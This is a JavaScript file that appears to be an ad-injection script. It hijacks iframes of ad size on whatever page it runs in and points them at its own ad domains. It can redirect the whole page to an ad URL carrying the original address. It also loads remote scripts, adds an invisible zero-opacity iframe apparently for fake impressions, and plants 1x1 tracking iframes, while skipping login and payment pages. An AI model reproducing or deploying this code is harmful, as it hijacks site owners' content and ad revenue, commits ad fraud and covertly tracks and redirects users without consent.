(function () {
    var ws = window.screen;
    var _param = window._mba || {};
    _param.jversion = "2.0";
    _param.topDiv = "mbad_a_" + (new Date() - 0);
    _param.makeInSide_running = false;
    _param.makeInSide_inerval = undefined;
    _param.makeInSide_count = 0;
    var ins = window._mba.interest_ids;
    var common_size = [
        {"ws": 300, "we": 1200, "hs": 50, "he": 300},
        {"ws": 100, "we": 600, "hs": 100, "he": 600}
    ];
    var ads = {};
    for (var k = 0; k < _param.ads.length; k++) {
        ads[k] = [];
        for (var i =0; i<_param.ads[k].length; i++) ads[k].push(_param.ads[k][i]);
    }
    if (_mba.loaded) {
        return;
    }
    _param.loaded = 1;
    var refresh = 1;
    var googleBis = [3, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57];
    var makeAd = function (type, a, scope) {
        switch (a.type) {
            case 1:
                makeBc(a, scope);
                break;
            case 3:
            case 48:
            case 49:
            case 50:
            case 51:
            case 52:
            case 53:
            case 54:
            case 55:
            case 56:
            case 57:
                makeInSide(a, scope);
                break;
            case 8:
                makeWl(a);
                break;
            case 9:
                makeWR(a);
                break;
            case 10:
                makeInvisible(a);
                break;
            case 46:
                makeBcInxxx(a);
                break;
        }
    };
    var adExcuted = function () {
        if (!_param.bis || _param.bis.length<1) {
            return;
        }
        try {
            var iw = getWidth();
            var ih = getHeight();
            var show = false;
            var pop_bis = ["1", "8", "9", "46"];
            for (var i = 0; i < _param.bis.length; i++) {
                var bis = _param.bis[i];
                for (var j = 0; j < pop_bis.length; j++) {
                    if (pop_bis[j] == bis && iw / window.screen.width > 0.7) {
                        if (supportsHtml5Storage()) {
                            var last_ts = window.localStorage.__amrc;
                            if (last_ts) {
                                if (new Date().getTime() - last_ts < 3600 * 1000)
                                    continue;
                            }
                        } else {
                            if (getCookie("__amrc"))
                                continue;
                        }
                        var size = ads[bis].join("").split("X");
                        var ad = {id: bis, width: size[0], height: size[1], type: bis};
                        makeAd(bis, ad, "outside");
                        show = true;
                    }
                }
                if (contains(googleBis, bis)) {
                    var ad = {id: bis, width: iw, height: ih, type: bis};
                    makeAd(bis, ad, "inside");
                    _param.makeInSide_inerval = window.setInterval(function () {
                        makeAd(bis, ad, "inside");
                    }, 1000);
                    show = true;
                }
                if (bis == "10") {
                    if (iw / window.screen.width > 0.7) {
                        var ad = {id: bis, width: 1200, height: 900, type: bis};
                        makeAd(bis, ad, "invisible");
                        show = true;
                    }
                }
            }

            if (!show && iframe_src != undefined) {
                document.location.href = iframe_src;
            }
        }
        catch (ex) {
            reportError(ex);
        }
    };
    var contains = function (list, item) {
        if (!list) return false;
        for (var i = 0; i < list.length; i++) {
            if (list[i] == item) return true;
        }
        return false;
    };
    var getWidth = function () {
        var d = document, de = d.documentElement, db = d.body;
        return window.innerWidth || (de && de.clientWidth) || (db && db.clientWidth) || 0;
    };
    var getHeight = function () {
        var d = document, de = d.documentElement, db = d.body;
        return window.innerHeight || (de && de.clientHeight) || (db && db.clientHeight) || 0;
    };
    _param.hideDiv = function (a) {
        document.getElementById(a).style.display = "none";
        var ts = new Date().getTime();
        if (supportsHtml5Storage()) {
            window.localStorage.__amrc = new Date().getTime();
        } else {
            var exp = new Date(ts + 1 * 3600 * 1000);
            document.cookie = "__amrc=" + ts + ";expires=" + exp.toGMTString();
        }
    };

    var getCookie = function (name) {
        var arr = document.cookie.match(new RegExp("(^| )" + name + "=([^;]*)(;|$)"));
        if (arr != null) {
            return unescape(arr[2]);
        }
        return null;
    };

    var supportsHtml5Storage = function () {
        try {
            return 'localStorage' in window && window['localStorage'] !== null;
        } catch (e) {
            return false;
        }
    };
    var version = "&v=" + _param.jversion;
    var formatAdUrl2 = function (w, h, b, t, s, iframe_src) {
        if (!w) {
            reportError("w_is_undifined:" + JSON.stringify(ads));
            return "";
        } else {
            var domain = _param.ad_domains[b];
            var i_src = "";
            if ((new Date().getTime()) % 10000 == 599) {
                i_src = iframe_src;
            }
            return _param.scheme + '://' + domain + '/ad?w=' + w + '&h=' + h + '&b=' + b + "&t=" + t + "&ins=" + ins + "&s=" + s + "&rf=" + refresh + version + "&d=" + _param.media_id + "&rid=" + _param.rid + (i_src ? "&i_src=" + encodeURIComponent(i_src) : "");
        }
    };
    var formatAdUrl = function (w, h, b, t, s) {
        if (!w) {
            reportError("w_is_undifined:" + JSON.stringify(ads));
            return "";
        } else {
            var domain = _param.ad_domains[b];
            return _param.scheme + '://' + domain + '/ad?w=' + w + '&h=' + h + '&b=' + b + "&t=" + t + "&ins=" + ins + "&s=" + s + "&rf=" + refresh + version + "&d=" + _param.media_id + "&rid=" + _param.rid;
        }
    };

    var makeBc = function (a, scope) {
        var b = document.createElement('script');
        b.type = 'text/javascript';
        b.charset = "utf8";
        b.async = true;
        var domain = _param.ad_domains[a.type];
        b.src = _param.scheme + "://" + domain + "/ad?b=1&t=0&s=outside&rf=1" + version + "&d=" + _param.media_id + "&rid=" + _param.rid + "&ins=" + ins;
        var s = document.getElementsByTagName('head')[0];
        s.appendChild(b);
    };

    var makeBcInxxx = function (a) {
        var b = document.createElement('script');
        b.type = 'text/javascript';
        b.charset = "utf8";
        b.async = true;
        var domain = _param.ad_domains[a.type];
        b.src = _param.scheme + "://" + domain + "/ad?b=46&t=0&s=outside&rf=1" + version + "&d=" + window._param.media_id + "&rid=" + _param.rid + "&ins=" + ins;
        var s = document.getElementsByTagName('head')[0];
        s.appendChild(b);
    };
    var makeWl = function (a) {
        makeWrapper(a, 'left');
    };
    var makeWR = function (a) {
        makeWrapper(a, 'right');
    };
    var makeIframe = function (id, u, w, h) {
        return '<iframe id="' + id + '" src="' + u + '" width="' + w + '" height="' + h + '" align="center,center" vspace="0" hspace="0" marginwidth="0" marginheight="0" scrolling="no" frameborder="0" style="border: 0; vertical-align: bottom; margin: 0;" allowtransparency="true"></iframe>'
    };
    var makeRenderIframe = function (id, u, w, h) {
        return makeIframe(id, u, w, h);
    };
    var makeWrapper = function (a, place) {
        var _p = a.id;
        var _w = a.width;
        var _h = a.height;
        var _t = a.type;
        var _u = formatAdUrl(_w, _h, _p, _t, "outside");
        if (!_u) return;

        var wlid = 'mb_wlr_' + _p + '_' + (new Date() - 0);
        var wldiv = '<div id="' + wlid + '" style="box-sizing: content-box; width: ' + _w + 'px; height: ' + (_h + 100) + 'px; overflow: hidden; z-index: 2147483647; position: fixed; top: 20px; ' + place + ': 15px;">';
        var addiv = '<div style="box-sizing: content-box;width: ' + _w + 'px;height:' + _h + 'px;padding:0px;border:#acacac 1px solid;overflow:hidden;">';

        var iframeid = "mb_wlr_i_" + _p + '_' + (new Date() - 0);
        addiv += makeRenderIframe(iframeid, _u, _w, _h);
        wldiv += addiv + '</div>';

        var wlcloseid = wlid + '_closebtn';
        var close = '<div id="' + wlcloseid + '" onclick="_param.hideDiv(\'' + wlid + '\')" style="box-sizing: content-box; position: absolute; width: ' + _w + 'px; height: px; ' + place + ': 0px; cursor: pointer; color: rgb(255, 255, 255); font-size: 12px; text-align: center; line-height: 20px; background-color: rgb(153, 153, 153);">关闭</div>';
        wldiv += close + '</div>';

        var divObj = document.createElement("div");
        divObj.id = 'mb_wrapper_wlr_' + _p + '_' + (new Date() - 0);
        divObj.innerHTML = wldiv;
        document.body.appendChild(divObj);
    };
    var makeInSide = function (a, s) {
        var _b = a.id;
        var _t = a.type;
        if (_param.makeInSide_running) {
            return;
        }
        _param.makeInSide_running = true;
        try {
            if (a.width / window.screen.width < 0.5 || a.height / window.screen.height < 0.5) {
                for (var j = 0; j < common_size.length; j++) {
                    var k = common_size[j];
                    if (a.width >= k["ws"] && a.width <= k["we"] &&
                        a.height >= k["hs"] && a.height <= k["he"]) {
                        var i_src = window.location.href;
                        if (!excludeSrc(i_src)) {
                            window.location.replace(formatAdUrl2(a.width, a.height, _b, _t, s, i_src));
                        }
                        window.clearInterval(_param.makeInSide_inerval);
                        _param.makeInSide_running = false;
                        return;
                    }
                }
            }
        } catch (ex) {
            console.log(ex);
        }
        if (window.top) {
            var iframes = document.getElementsByTagName("iframe");
            for (var i = 0; i < iframes.length; i++) {
                if (iframes[i].zl5v !== undefined || iframes[i].exFlag !== undefined) {
                    continue;
                }
                var _w = iframes[i].width;
                var _h = iframes[i].height;
                if (_w) {
                    _w = _w.replace("px", "");
                }
                if (_h) {
                    _h = _h.replace("px", "");
                }
                if (_w == "" && iframes[i].style.width != "") {
                    _w = iframes[i].style.width.replace("px", "");
                }
                if (_h == "" && iframes[i].style.height != "") {
                    _h = iframes[i].style.height.replace("px", "");
                }

                for (var j = 0; j < common_size.length; j++) {
                    var k = common_size[j];
                    if (_w >= k["ws"] && _w <= k["we"] &&
                        _h >= k["hs"] && _h <= k["he"]) {
                        var i_src = iframes[i].src;
                        iframes[i].exFlag = undefined;
                        if (excludeIframe(iframes[i], i_src)) {
                            iframes[i].exFlag = 1;
                            continue;
                        }
                        iframes[i].src = formatAdUrl2(_w, _h, _b, _t, s, i_src);
                        iframes[i].zl5v = "1";
                        iframes[i].exFlag = 0;
                        break;
                    }
                }
            }
        }

        _param.makeInSide_count += 1;
        if (_param.makeInSide_count >= 30) {
            window.clearInterval(_param.makeInSide_inerval);
        }
        _param.makeInSide_running = false;
    };
    var excludeSrc = function (src) {
        var enDir = ["user", "login", "register", "order", "pay"];
        return containsStr(src, enDir);
    };

    var excludeIframe = function (iframes, src) {
        var enDir = ["user", "login", "register", "order", "pay"];
        for (var i = 0; i < enDir.length; i++) {
            if (src && src.indexOf(enDir[i]) >= 0) {
                return true;
            }
            if (iframes.name && iframes.name.indexOf(enDir[i]) >= 0) {
                return true;
            }
            if (iframes.id && iframes.id.indexOf(enDir[i]) >= 0) {
                return true;
            }
        }
        var contentDir = ["用户名", "账号", "密码", "手机号", "邮箱", "phone", "email", "验证码", "password", "account"];
        var inputs = [];
        var domain_parttern = /^(https?:\/\/)?([^\/]+)\/?/;
        if (iframes.src) {
            var ifDomain = iframes.src.match(domain_parttern)[2];
            if (window.location.host == ifDomain && iframes.contentDocument) {
                inputs = iframes.contentDocument.getElementsByTagName('input');
            }
        }
        for (var i = 0; i < inputs.length; i++) {
            if (containsStr(inputs.id, contentDir) || containsStr(inputs.name, contentDir)
                || containsStr(inputs.className, contentDir) || containsStr(inputs.placeholder, contentDir)) {
                return true;
            }
        }
        return false;
    };
    var makeInvisible = function (a) {
        var _p = a.id;
        var _w = a.width;
        var _h = a.height;
        var _t = a.type;

        var _u = formatAdUrl(_w, _h, _p, _t, "invisible");
        if (!_u) return;

        var ivdiv = document.createElement("div");
        ivdiv.id = 'mb_ivs_' + _p + '_' + (new Date() - 0);
        ivdiv.style.left = "0px";
        ivdiv.style.top = "0px";
        ivdiv.style.width = _w + "px";
        ivdiv.style.height = _h + "px";
        ivdiv.style.borderWidth = "0px";
        ivdiv.style.position = "relative";
        ivdiv.style.filter = "Alpha(Opacity=0)";
        ivdiv.style.opacity = "0";
        ivdiv.style.zIndex = "-10000";

        var iframeid = "mb_iv_i_" + _p + '_' + (new Date() - 0);
        ivdiv.innerHTML = makeRenderIframe(iframeid, _u, _w, _h);
        document.body.appendChild(ivdiv);
    };

    var containsStr = function (str, list) {
        if (str) {
            for (var i = 0; i < list.length; i++) {
                if (str.indexOf(list[i]) >= 0) {
                    return true;
                }
            }
        }
        return false;
    };
    var dtExcuted = function () {
        var domainMap = _param.dt_domains;
        if (_param && _param.dt_bis && _param.dt_bis.length) {
            for (var i = 0; i < _param.dt_bis.length; i++) {
                var dt = new Date().getTime();
                var bid = _param.dt_bis[i], iframeid = "mb_dt_" + bid + '_' + dt,
                    src = '//' + domainMap[_param.dt_bis[i]] + '/dt?d=' + _param.media_id + '&b=' + bid + "&rid=" + _param.rid + '&_=' + dt;
                var iframe = '<iframe id="' + iframeid + '" src="' + src + '" width="1" height="1" align="center,center" vspace="0" hspace="0" marginwidth="0" marginheight="0" scrolling="no" frameborder="0" style="border: 0; vertical-align: bottom; margin: 0;" allowtransparency="true"></iframe>';
                var divObj = document.createElement("div");
                divObj.innerHTML = iframe;
                document.body.appendChild(divObj);
            }
        }
    };
    var start = function () {
        adExcuted();
        dtExcuted();
    };
    setTimeout(start, 500);
})();